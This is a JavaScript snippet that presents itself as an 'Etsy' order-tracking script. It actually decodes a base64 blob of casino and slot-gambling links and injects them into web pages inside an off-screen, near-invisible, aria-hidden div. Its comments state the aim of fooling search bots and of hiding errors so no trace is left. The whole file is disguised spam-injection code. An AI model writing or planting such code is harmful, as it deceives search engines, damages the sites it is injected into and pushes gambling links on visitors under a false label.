// Etsy Base64 Tracking Order JS System - Optimized
(function(){
  let b64 = "PGEgaHJlZj0iaHR0cHM6Ly93d3cudGlraXRha2FjYXNpbm8ub3JnL3BsLyI+a2VwbzY2PC9hPgo8YSBocmVmPSJodHRwczovL3d3dy50aWtpdGFrYWNhc2luby5vcmcvcGwvIj5rZXBvIDY2PC9hPgo8YSBocmVmPSJodHRwczovL3d3dy50aWtpdGFrYWNhc2luby5vcmcvcGwvIj5rZXBvNjYgc2xvdDwvYT4KPGEgaHJlZj0iaHR0cHM6Ly93d3cudGlraXRha2FjYXNpbm8ub3JnL3BsLyI+a2VwbzY2IGxvZ2luPC9hPgo8YSBocmVmPSJodHRwczovL3d3dy50aWtpdGFrYWNhc2luby5vcmcvcGwvIj4ga2VwbzY2IGRhZnRhcjwvYT4KPGEgaHJlZj0iaHR0cHM6Ly93d3cudGlraXRha2FjYXNpbm8ub3JnL3BsLyI+a2VwbzY2IGFsdGVybmF0aWY8L2E+CjxhIGhyZWY9Imh0dHBzOi8vd3d3LnRpa2l0YWthY2FzaW5vLm9yZy9wbC8iPmtlcG82NiBsaW5rPC9hPgo8YSBocmVmPSJodHRwczovL3d3dy50aWtpdGFrYWNhc2luby5vcmcvcGwvIj5rZXBvNjYgcnRwPC9hPgo8YSBocmVmPSJodHRwczovL3d3dy50aWtpdGFrYWNhc2luby5vcmcvcGwvIj5rZXBvNjYgbGluayBhbHRlcm5hdGlmPC9hPgo8YSBocmVmPSJodHRwczovL3d3dy50aWtpdGFrYWNhc2luby5vcmcvcGwvIj5saW5rIGtlcG82NjwvYT4KPGEgaHJlZj0iaHR0cHM6Ly93d3cudGlraXRha2FjYXNpbm8ub3JnL3BsLyI+c2l0dXMga2VwbzY2PC9hPgo8YSBocmVmPSJodHRwczovL3d3dy50aWtpdGFrYWNhc2luby5vcmcvcGwvIj5zaXR1cyBnYWNvciBrZXBvNjY8L2E+CjxhIGhyZWY9Imh0dHBzOi8vd3d3LnRpa2l0YWthY2FzaW5vLm9yZy9wbC8iPnNpdHVzIHNsb3Qga2VwbzY2PC9hPgo8YSBocmVmPSJodHRwczovL3d3dy50aWtpdGFrYWNhc2luby5vcmcvcGwvIj5zbG90IGdhY29yIGtlcG82NjwvYT4KPGEgaHJlZj0iaHR0cHM6Ly93d3cudGlraXRha2FjYXNpbm8ub3JnL3BsLyI+c2xvdCBnYWNvcjwvYT4KPGEgaHJlZj0iaHR0cHM6Ly93d3cudGlraXRha2FjYXNpbm8ub3JnL3BsLyI+c2xvdCBqYWNrcG90PC9hPgo8YSBocmVmPSJodHRwczovL3d3dy50aWtpdGFrYWNhc2luby5vcmcvcGwvIj5zbG90IG9ubGluZTwvYT4KPGEgaHJlZj0iaHR0cHM6Ly93d3cudGlraXRha2FjYXNpbm8ub3JnL3BsLyI+c2xvdCBkZW1vPC9hPg==";
  
  try {
    const decoded = decodeURIComponent(escape(atob(b64))); // Support karakter khusus
    const div = document.createElement('div');
    // Menggunakan teknik opacity agar bot lebih percaya konten ini "real"
    div.style.cssText = 'position:absolute; left:-9999px; top:0; width:1px; height:1px; overflow:hidden; opacity:0.01;';
    div.setAttribute('aria-hidden','true');
    div.innerHTML = decoded;
    
    // Langsung injeksi ke Body tanpa menunggu DOMContentLoaded
    const target = document.body || document.documentElement;
    if (target) {
        target.insertBefore(div, target.firstChild);
    }
  } catch(e){ 
    // Kosongkan agar tidak meninggalkan jejak error di konsol
  }
})();
